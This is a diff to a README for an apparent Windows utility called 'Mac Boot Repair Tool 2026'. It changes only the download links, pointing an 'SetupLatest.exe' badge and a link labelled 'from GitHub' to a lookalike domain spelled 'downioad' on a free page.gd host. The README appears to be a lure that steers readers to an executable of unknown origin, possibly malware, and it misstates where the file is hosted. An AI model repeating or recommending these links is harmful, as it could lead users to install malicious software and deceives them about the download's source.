@@ -2,7 +2,7 @@
 
 Mac Boot Repair Tool 2026 is a lightweight Windows application designed to help users diagnose and repair boot issues on Mac systems. Whether your Mac won't start or has startup disk errors, this tool provides a straightforward solution from your Windows PC. It supports a wide range of Mac models and macOS versions, ensuring reliable recovery without the need for advanced technical skills.
 
-[![Download Installer](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ The tool requires the Mac to be at least partially functional to enter diagnosti
 
 To get started, download the latest version of Mac Boot Repair Tool 2026 from the link below. This package includes all necessary files and is regularly updated for improved performance and compatibility.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## License and Credits
 
